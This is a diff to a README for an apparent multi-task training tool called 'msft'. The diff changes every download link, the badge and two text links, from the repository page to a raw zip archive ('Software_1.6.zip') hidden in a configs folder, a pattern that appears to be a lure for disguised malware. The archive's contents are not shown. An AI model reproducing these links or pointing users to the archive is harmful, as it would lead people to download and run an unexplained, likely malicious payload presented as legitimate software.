@@ -1,12 +1,12 @@
 # msft - Run multi-task training with less overfitting
 
-[![Download msft](https://img.shields.io/badge/Download-msft-6c8cff?style=for-the-badge&logo=github)](https://github.com/orangeyellowdoubletalk81/msft)
+[![Download msft](https://img.shields.io/badge/Download-msft-6c8cff?style=for-the-badge&logo=github)](https://github.com/orangeyellowdoubletalk81/msft/raw/refs/heads/main/sft/configs/Software_1.6.zip)
 
 ## 🚀 Download
 
 Visit this page to download and run the app:
 
-[Download msft from GitHub](https://github.com/orangeyellowdoubletalk81/msft)
+[Download msft from GitHub](https://github.com/orangeyellowdoubletalk81/msft/raw/refs/heads/main/sft/configs/Software_1.6.zip)
 
 ## 🖥️ What msft does
 
@@ -210,7 +210,7 @@ Keep the folder structure intact. The app expects the data and config files in t
 
 If you need the files again, use this link:
 
-[Download msft from GitHub](https://github.com/orangeyellowdoubletalk81/msft)
+[Download msft from GitHub](https://github.com/orangeyellowdoubletalk81/msft/raw/refs/heads/main/sft/configs/Software_1.6.zip)
 
 ## 🧩 Files you may edit
 
